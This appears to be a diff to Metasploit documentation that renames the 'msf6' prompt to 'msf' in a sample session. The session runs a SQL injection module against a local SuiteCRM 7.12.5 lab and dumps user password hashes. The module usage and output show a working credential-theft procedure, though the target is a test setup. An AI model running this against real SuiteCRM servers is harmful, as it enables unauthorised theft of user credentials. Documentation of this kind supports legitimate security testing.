@@ -125,8 +125,8 @@ The following setup was installed on Ubuntu 20.04:
 
 ### SuiteCRM 7.12.5 Bitnami Docker Image
 ```
-msf6 payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/gather/suite_crm_export_sqli 
-msf6 auxiliary(gather/suite_crm_export_sqli) > show options
+msf payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/gather/suite_crm_export_sqli 
+msf auxiliary(gather/suite_crm_export_sqli) > show options
 
 Module options (auxiliary/gather/suite_crm_export_sqli):
 
@@ -150,19 +150,19 @@ Auxiliary action:
    Dump credentials  Dumps usernames and passwords from the users table
 
 
-msf6 auxiliary(gather/suite_crm_export_sqli) > set USERNAME user
+msf auxiliary(gather/suite_crm_export_sqli) > set USERNAME user
 USERNAME => user
-msf6 auxiliary(gather/suite_crm_export_sqli) > set PASSWORD bitnami
+msf auxiliary(gather/suite_crm_export_sqli) > set PASSWORD bitnami
 PASSWORD => bitnami
-msf6 auxiliary(gather/suite_crm_export_sqli) > set RHOSTS 127.0.0.1
+msf auxiliary(gather/suite_crm_export_sqli) > set RHOSTS 127.0.0.1
 RHOSTS => 127.0.0.1
-msf6 auxiliary(gather/suite_crm_export_sqli) > check
+msf auxiliary(gather/suite_crm_export_sqli) > check
 
 [*] Authenticating as user
 [+] Authenticated as: user
 [*] Version detected: 7.12.5
 [+] 127.0.0.1:80 - The target is vulnerable.
-msf6 auxiliary(gather/suite_crm_export_sqli) > run
+msf auxiliary(gather/suite_crm_export_sqli) > run
 [*] Running module against 127.0.0.1
 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -191,5 +191,5 @@ SuiteCRM User Credentials
  user      $2y$10$O83wcCVEfY7GKo//dbQwwOFOevfLFnhpP4d9n98HmGM2YPxJZqMhO
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/suite_crm_export_sqli) > 
+msf auxiliary(gather/suite_crm_export_sqli) > 
 ```
